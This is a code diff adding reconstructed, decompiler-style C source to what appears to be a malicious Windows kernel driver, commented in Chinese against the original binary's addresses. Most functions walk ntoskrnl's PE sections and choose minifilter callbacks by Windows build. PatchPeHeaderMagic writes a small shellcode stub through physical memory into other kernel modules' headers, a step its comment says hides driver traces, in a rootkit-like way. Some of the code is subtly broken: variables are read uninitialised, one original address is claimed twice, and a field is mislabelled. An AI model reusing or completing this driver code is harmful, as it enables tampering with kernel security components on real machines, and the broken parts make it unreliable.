@@ -8,6 +8,11 @@
 extern KMUTEX g_Mutex;
 extern volatile PVOID g_Pointer;
 
+// 壳代码数据 — 用于 PatchPeHeaderMagic 修补 PE 头魔数
+// 对应原始驱动 g_ShellCodeBuffer (0x14008CA40) / g_ShellCodeMovEax (0x14008CA44)
+DWORD g_ShellCodeBuffer = 0x22B8;
+DWORD g_ShellCodeMovEax = 0xC3C0;
+
 // 前向声明 — 这些函数在被定义之前已被调用
 __int64 (__fastcall *__fastcall FsFilterCreateCallback(__int64 FilterContext))(__int64);
 __int64 MiniFilterTeardownRoutine(void *NameBuffer, size_t BufferSize, char IsAddOperation);
@@ -3133,6 +3138,327 @@ __int64 __fastcall FileSystemFilterCallback(char *PatchBuffer, int BufferSize)
                     }
                 }
                 return PatchResult & WriteResult;
+            }
+        }
+    }
+    return Result;
+}
+
+// MiniFilterQueryFileName — MiniFilter 文件名查询
+// 遍历通知链表，不区分大小写比较文件名是否已存在
+// 对应原始驱动 sub_140019D8C
+char MiniFilterQueryFileName(wchar_t *FileName)
+{
+    volatile ULONG64 CurrentEntry = (ULONG64)g_Pointer;
+    char Result = 0;
+
+    while (CurrentEntry)
+    {
+        if (!_wcsicmp(FileName, (const wchar_t *)(CurrentEntry + 12)))
+            return 1;
+        CurrentEntry = *(_QWORD *)CurrentEntry;
+    }
+    return Result;
+}
+
+// FindKernelInitSection — 查找内核 INIT 节
+// 遍历 PE 节表查找 INIT 节（标志 1349），计算 INIT 节结束位置，写入全局表 GT 索引 0x183
+// 对应原始驱动 sub_140012C28
+ULONG64 FindKernelInitSection(void)
+{
+    char FoundInitSection = 0;
+    __int64 PeBase, PeSize, NtImageBase, SectionAddr, SectionOffset;
+    unsigned int SectionIndex;
+    int SectionSize;
+    __int16 SectionFlags;
+    char ReadContext[0x198];
+    _DWORD SectionInfo[14];
+    unsigned int InitSectionSize;
+    __int64 SectionFlags2, SectionDataPtr, SectionCharacteristics;
+    unsigned int RawSize;
+    __int64 SectionName;
+
+    GtWrite((GLOBAL_TABLE_INDEX)0x913, 0);
+    if ((unsigned int)GtRead(GtWindowsBuildNumber) >= 0x1770)
+    {
+        PeBase = GtRead((GLOBAL_TABLE_INDEX)0x20);
+        PeSize = GtRead((GLOBAL_TABLE_INDEX)0x21);
+        NtImageBase = GtRead(GtNtoskrnlModuleBase);
+        SectionAddr = GtRead((GLOBAL_TABLE_INDEX)0x177);
+        if (PeBase && PeSize && NtImageBase && SectionAddr > NtImageBase)
+        {
+            SectionOffset = (unsigned int)(SectionAddr - NtImageBase);
+            if ((unsigned int)SectionOffset < PeSize && SectionAddr == SectionOffset + NtImageBase)
+            {
+                InitPESectionReadContext(PeBase + SectionOffset, (ULONG)(PeSize - SectionOffset), 2, 0, -1, 0, 0, (__int64)ReadContext);
+                for (SectionIndex = 0; SectionIndex < 0x64; ++SectionIndex)
+                {
+                    if (ReadPESectionEntry(ReadContext, SectionInfo))
+                        break;
+                    SectionSize = RawSize + (ULONG)SectionInfo[2];
+                    SectionInfo[2] += RawSize;
+                    SectionFlags = *(__int16 *)(SectionName + 6);
+                    if (SectionFlags == 1349)
+                        break;
+                    if (SectionFlags == 1069 && SectionCharacteristics == 0x1000000000LL && !SectionDataPtr)
+                        FoundInitSection = 1;
+                    else if (SectionFlags == 1368 && (SectionFlags2 & 0x4000000) != 0 && InitSectionSize)
+                    {
+                        if (FoundInitSection == 1)
+                        {
+                            ULONG64 Result = SectionSize + InitSectionSize - (ULONG)PeBase;
+                            if ((unsigned int)Result < PeSize)
+                                return GtWrite((GLOBAL_TABLE_INDEX)0x183, NtImageBase + (unsigned int)Result);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return 0;
+}
+
+// FindKernelDataSectionDispatch — 内核数据节查找分发
+// 根据版本号选择不同的查找策略
+// 对应原始驱动 sub_140013A98
+ULONG64 FindKernelDataSectionDispatch(void)
+{
+    ULONG64 BuildNumber = (ULONG)GtRead(GtWindowsBuildNumber);
+    if (BuildNumber >= 0x1DB0 && BuildNumber <= 0x1DB1)
+        return FindKernelDataSectionByCode();
+    return BuildNumber;
+}
+
+// FindKernelDataSectionByCode — 通过 CODE 节查找内核数据节
+// 遍历 PE 节表，找到 CODE 节后的第一个数据节，计算偏移写入全局表
+// 对应原始驱动 sub_140013A98
+ULONG64 FindKernelDataSectionByCode(void)
+{
+    __int64 PeBase, PeSize, NtImageBase, SectionAddr, SectionOffset;
+    char FoundCodeSection = 0;
+    unsigned int SectionIndex;
+    int SectionSize;
+    __int16 SectionFlags;
+    char ReadContext[0x198];
+    _DWORD SectionInfo[14];
+    unsigned int DataSectionSize;
+    __int64 SectionFlags2, SectionAlign;
+    unsigned int RawSize;
+    __int64 SectionName;
+
+    PeBase = GtRead((GLOBAL_TABLE_INDEX)0x20);
+    PeSize = GtRead((GLOBAL_TABLE_INDEX)0x21);
+    NtImageBase = GtRead(GtNtoskrnlModuleBase);
+    SectionAddr = GtRead((GLOBAL_TABLE_INDEX)0x177);
+    if (PeBase && PeSize && NtImageBase && SectionAddr > NtImageBase)
+    {
+        SectionOffset = (unsigned int)(SectionAddr - NtImageBase);
+        if ((unsigned int)SectionOffset < PeSize && SectionAddr == SectionOffset + NtImageBase)
+        {
+            InitPESectionReadContext(PeBase + SectionOffset, (ULONG)(PeSize - SectionOffset), 2, 0, -1, 0, 0, (__int64)ReadContext);
+            for (SectionIndex = 0; SectionIndex < 0x200; ++SectionIndex)
+            {
+                if (ReadPESectionEntry(ReadContext, SectionInfo))
+                    break;
+                SectionSize = RawSize + (ULONG)SectionInfo[2];
+                SectionInfo[2] += RawSize;
+                SectionFlags = *(__int16 *)(SectionName + 6);
+                if (SectionFlags == 360 && (SectionFlags2 & 0x40) != 0 && SectionAlign == 64)
+                    FoundCodeSection = 1;
+                else if (FoundCodeSection == 1 && SectionFlags == 1368 && (SectionFlags2 & 0x4000000) != 0 && DataSectionSize)
+                {
+                    ULONG64 Result = SectionSize + DataSectionSize - (ULONG)PeBase;
+                    if ((unsigned int)Result < PeSize)
+                        return GtWrite((GLOBAL_TABLE_INDEX)0x181, NtImageBase + (unsigned int)Result);
+                }
+            }
+        }
+    }
+    return 0;
+}
+
+// FindKernelDataSectionByData — 通过 DATA 节查找内核数据节
+// 遍历 PE 节表匹配子类型，定位数据节偏移，写入全局表
+// 对应原始驱动 sub_140013C48
+ULONG64 FindKernelDataSectionByData(void)
+{
+    __int64 PeBase, PeSize, NtImageBase;
+    int ExportDirSize;
+    ULONG64 SectionAddr, SectionOffset;
+    unsigned __int8 SectionType;
+    unsigned int CodeSectionIndex = 0, DataSectionIndex = 0;
+    char FoundDataSection = 0;
+    unsigned int SectionIndex;
+    int SectionSize;
+    __int16 SectionFlags;
+    unsigned __int8 TypeFlag;
+    char ReadContext[0x1A8];
+    __int64 VirtualSize = 0;
+    _DWORD SectionInfo[14];
+    unsigned int DataSectionSize;
+    __int64 SectionFlags2;
+    unsigned int SubType;
+    unsigned int RawSize;
+    __int64 SectionName;
+
+    PeBase = GtRead((GLOBAL_TABLE_INDEX)0x20);
+    PeSize = GtRead((GLOBAL_TABLE_INDEX)0x21);
+    NtImageBase = GtRead(GtNtoskrnlModuleBase);
+    ExportDirSize = (int)GtRead((GLOBAL_TABLE_INDEX)0x912);
+    SectionAddr = GtRead((GLOBAL_TABLE_INDEX)0x179);
+    if (PeBase && PeSize && NtImageBase && ExportDirSize && SectionAddr > (ULONG64)NtImageBase)
+    {
+        SectionOffset = (unsigned int)(SectionAddr - NtImageBase);
+        if ((unsigned int)SectionOffset < PeSize && SectionAddr == SectionOffset + NtImageBase)
+        {
+            InitPESectionReadContext(SectionOffset + PeBase, (ULONG)(PeSize - SectionOffset), 2, 0, -1, 0, 0, (__int64)ReadContext);
+            SectionType = TypeFlag;
+            for (SectionIndex = 0; SectionIndex < 0x200; ++SectionIndex)
+            {
+                if (ReadPESectionEntry(ReadContext, SectionInfo))
+                    break;
+                SectionSize = RawSize + (ULONG)VirtualSize;
+                VirtualSize += RawSize;
+                SectionFlags = *(__int16 *)(SectionName + 6);
+                if (SectionFlags == 1298 && SectionFlags2 == 64)
+                {
+                    switch (SubType)
+                    {
+                        case 2: CodeSectionIndex = SectionIndex; break;
+                        case 9: DataSectionIndex = SectionIndex; break;
+                        case 1:
+                            if (CodeSectionIndex && CodeSectionIndex + 1 == SectionIndex)
+                            { FoundDataSection = 1; SectionType = 1; }
+                            else if (DataSectionIndex && DataSectionIndex + 3 == SectionIndex)
+                            { FoundDataSection = 1; SectionType = 0; }
+                            break;
+                    }
+                }
+                else if (FoundDataSection == 1 && SectionFlags == 1368 && (SectionFlags2 & 0x4000000) != 0 && DataSectionSize)
+                {
+                    ULONG64 Result = SectionSize + DataSectionSize - (ULONG)PeBase;
+                    if ((_DWORD)Result && (unsigned int)Result < PeSize)
+                    {
+                        GtWrite((GLOBAL_TABLE_INDEX)0x199, NtImageBase + (unsigned int)Result);
+                        return GtWrite((GLOBAL_TABLE_INDEX)0x912, SectionType);
+                    }
+                }
+            }
+        }
+    }
+    return 0;
+}
+
+// InitImageNotifyWin7 — Win7 镜像通知初始化分发
+// 版本检查（>= 0x1DB0），条件满足时调用 InitImageNotifyCallbackWin7
+// 对应原始驱动 sub_14001358C
+__int64 InitImageNotifyWin7(void)
+{
+    __int64 result = GtRead(GtWindowsBuildNumber);
+    if ((unsigned int)result >= 0x1DB0)
+        return InitImageNotifyCallbackWin7();
+    return result;
+}
+
+// SelectMiniFilterCallbackByVersion — 根据版本选择 Minifilter 回调
+// 版本 <= 0x23F0 时调用 MiniFilterPostCreate，>= 0x42EE 时调用 MiniFilterPreCreate，否则调用 MiniFilterPreRead
+// 对应原始驱动 sub_140014078
+__int64 SelectMiniFilterCallbackByVersion(void)
+{
+    if ((unsigned int)GtRead(GtWindowsBuildNumber) <= 0x23F0)
+        return ((__int64 (*)(void))MiniFilterPostCreate)();
+    if ((unsigned int)GtRead(GtWindowsBuildNumber) >= 0x42EE)
+        return ((__int64 (*)(void))MiniFilterPreCreate)();
+    return ((__int64 (*)(void))MiniFilterPreRead)();
+}
+
+// SelectMiniFilterCleanupCallback — 选择 Minifilter 清理回调
+// 版本 >= 0x4A61 时调用 MiniFilterPostWrite，否则调用 MiniFilterPreCleanup
+// 对应原始驱动 sub_140014D08
+__int64 SelectMiniFilterCleanupCallback(void)
+{
+    if ((unsigned int)GtRead(GtWindowsBuildNumber) >= 0x4A61)
+        return ((__int64 (*)(void))MiniFilterPostWrite)();
+    else
+        return ((__int64 (*)(void))MiniFilterPreCleanup)();
+}
+
+// SelectMiniFilterDirEnumCallback — 选择 Minifilter 目录枚举回调
+// 版本 < 0x23F0 时调用 MiniFilterPreDirEnum，>= 0x2800 时调用 MiniFilterPreClose，否则调用 MiniFilterPreSetInfo
+// 对应原始驱动 sub_1400152D4
+__int64 SelectMiniFilterDirEnumCallback(void)
+{
+    if ((unsigned int)GtRead(GtWindowsBuildNumber) < 0x23F0)
+        return ((__int64 (*)(void))MiniFilterPreDirEnum)();
+    if ((unsigned int)GtRead(GtWindowsBuildNumber) >= 0x2800)
+        return ((__int64 (*)(void))MiniFilterPreClose)();
+    return ((__int64 (*)(void))MiniFilterPreSetInfo)();
+}
+
+// SelectMiniFilterWriteReadCallback — 选择 Minifilter 写/读回调
+// 版本 > 0x23F0 时调用 MiniFilterPreWrite，否则调用 MiniFilterPostRead
+// 对应原始驱动 sub_1400146D4
+unsigned __int64 SelectMiniFilterWriteReadCallback(void)
+{
+    if ((unsigned int)GtRead(GtWindowsBuildNumber) > 0x23F0)
+        return ((unsigned __int64 (*)(void))MiniFilterPreWrite)();
+    else
+        return ((unsigned __int64 (*)(void))MiniFilterPostRead)();
+}
+
+// PatchPeHeaderMagic — 修补 PE 头魔数
+// 通过 WritePhysicalMemoryBuffer 修改内核模块的 PE 头部数据目录字段，
+// 根据 PE 魔数类型写入 6 字节或 8 字节数据，用于隐藏驱动痕迹
+// 对应原始驱动 sub_14001A278
+char __fastcall PatchPeHeaderMagic(__int64 QueryResult)
+{
+    unsigned __int64 ImageBase = *(_QWORD *)(QueryResult + 8);
+    char Result = 0;
+    __int64 PeOffset;
+    unsigned __int64 ImageSize;
+    __int64 NtHeader;
+    __int16 PeMagic;
+    unsigned __int64 DataDirRva;
+    unsigned __int64 DataDirSize;
+    _QWORD ShellData[4];
+
+    memset(ShellData, 0, sizeof(ShellData));
+    if (ImageBase > (unsigned __int64)MmSystemRangeStart)
+    {
+        PeOffset = *(int *)(ImageBase + 60);
+        if ((int)PeOffset > 0)
+        {
+            ImageSize = *(_QWORD *)(QueryResult + 24);
+            if ((unsigned int)PeOffset < ImageSize && (unsigned __int64)(unsigned int)PeOffset + 248 < ImageSize)
+            {
+                NtHeader = ImageBase + PeOffset;
+                PeMagic = *(_WORD *)(ImageBase + PeOffset + 4);
+                if (PeMagic == 512 || PeMagic == -31132)
+                {
+                    // PE32+：写入 6 字节壳代码
+                    if ((unsigned __int64)(unsigned int)PeOffset + 264 < ImageSize)
+                    {
+                        DataDirSize = *(unsigned int *)(NtHeader + 40);
+                        if (DataDirSize < ImageSize && (unsigned int)(DataDirSize + 6) < ImageSize)
+                        {
+                            LODWORD_LV(ShellData[0]) = g_ShellCodeBuffer;
+                            *(WORD *)((PUCHAR)&ShellData[0] + 4) = (WORD)g_ShellCodeMovEax;
+                            WritePhysicalMemoryBuffer(ImageBase + *(unsigned int *)(NtHeader + 40), ShellData, 6u, 0, 0);
+                            return 1;
+                        }
+                    }
+                }
+                else
+                {
+                    // PE32：写入 8 字节数据
+                    DataDirRva = *(unsigned int *)(NtHeader + 40);
+                    if (DataDirRva < ImageSize && (unsigned int)(DataDirRva + 8) < ImageSize)
+                    {
+                        ShellData[0] = 0x8C2C0000022B8LL;
+                        WritePhysicalMemoryBuffer(ImageBase + *(unsigned int *)(NtHeader + 40), ShellData, 8u, 0, 0);
+                        return 1;
+                    }
+                }
             }
         }
     }
